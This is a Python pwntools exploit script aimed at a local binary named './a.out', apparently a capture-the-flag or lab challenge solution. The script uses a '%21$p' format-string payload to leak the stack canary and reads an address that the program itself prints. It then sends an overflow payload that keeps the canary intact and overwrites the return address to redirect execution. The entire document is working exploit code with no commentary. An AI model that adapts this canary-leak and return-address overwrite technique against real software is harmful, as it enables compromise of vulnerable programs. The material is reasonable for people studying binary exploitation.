#!/usr/bin/python
import pwn

pty = pwn.process.PTY
proc = pwn.process("./a.out", stdin = pty, stdout = pty)

proc.recvuntil(b"lies at ")
addr = proc.recvline().decode("utf-8").strip()
# print("addr =", addr)

addr = int(addr, 16)

proc.recvline()
proc.recvline()

pad = b"-" * 11
buffer = b"a" * 32
format_string_payload = buffer + pad + b"%21$p"

proc.sendline(format_string_payload)

proc.recvline()
proc.sendline(b"2020")

proc.recvline()
proc.sendline(b"06")

proc.recvline()
proc.sendline(b"16")

proc.recvuntil(b"to " + pad)

canary = proc.recvline().decode("utf-8").strip()
# print("canary =", canary)

canary = int(canary, 16)

proc.recvuntil(b"you?")

buffer = b"a" * 32
format_string = b"b" * 16

padding = b"c" * 8

payload = buffer + format_string + padding + pwn.p64(canary) + padding + pwn.p64(addr)

proc.sendline(payload)

proc.recvline()
proc.recvline()
print("############################# PROGRAM OUTPUT #########################")
print(proc.recvline().decode("utf-8"))
print("######################################################################")
